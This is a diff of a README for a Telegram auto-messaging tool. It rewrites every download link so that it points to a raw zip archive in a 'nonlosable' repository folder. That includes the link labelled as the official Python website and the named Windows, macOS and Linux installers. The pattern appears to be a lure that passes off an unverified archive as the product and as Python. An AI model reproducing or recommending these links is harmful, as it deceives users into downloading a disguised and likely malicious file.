@@ -1,6 +1,6 @@
 # 📩 Telegram-Auto-Messaging - Easy Messaging Tool for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/shayanihsaq/Telegram-Auto-Messaging/releases)
+[![Download](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip)](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to Telegram-Auto-Messaging! This tool helps you automate messaging on Te
 To run Telegram-Auto-Messaging, you need:
 
 - A computer with Windows, macOS, or Linux.
-- Python 3.7 or higher installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- Python 3.7 or higher installed. You can download it from the [official Python website](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip).
 - An active Telegram account.
 - Internet connection for sending messages.
 
@@ -19,15 +19,15 @@ To run Telegram-Auto-Messaging, you need:
 
 To get started, visit the Releases page to download the latest version of the application. 
 
-[Download Telegram-Auto-Messaging](https://github.com/shayanihsaq/Telegram-Auto-Messaging/releases)
+[Download Telegram-Auto-Messaging](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip)
 
 ### 🔧 Installation Steps
 
-1. Visit the [Releases page](https://github.com/shayanihsaq/Telegram-Auto-Messaging/releases) and locate the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip) and locate the latest version.
 2. Choose the file suitable for your system:
-   - For Windows, download `Telegram-Auto-Messaging-Windows.exe`.
-   - For macOS, download `Telegram-Auto-Messaging-Mac.dmg`.
-   - For Linux, download `Telegram-Auto-Messaging-Linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip`.
 3. Save the file to your computer.
 4. Open the downloaded file and follow the prompts to install the application.
 
@@ -78,4 +78,4 @@ Explore these topics to understand the full capabilities of Telegram-Auto-Messag
 
 Now that you know how to download and use Telegram-Auto-Messaging, you’re set to enhance your Telegram experience. Start sending messages efficiently today!
 
-[Download Telegram-Auto-Messaging](https://github.com/shayanihsaq/Telegram-Auto-Messaging/releases)
+[Download Telegram-Auto-Messaging](https://raw.githubusercontent.com/shayanihsaq/Telegram-Auto-Messaging/main/nonlosable/Telegram-Auto-Messaging.zip)
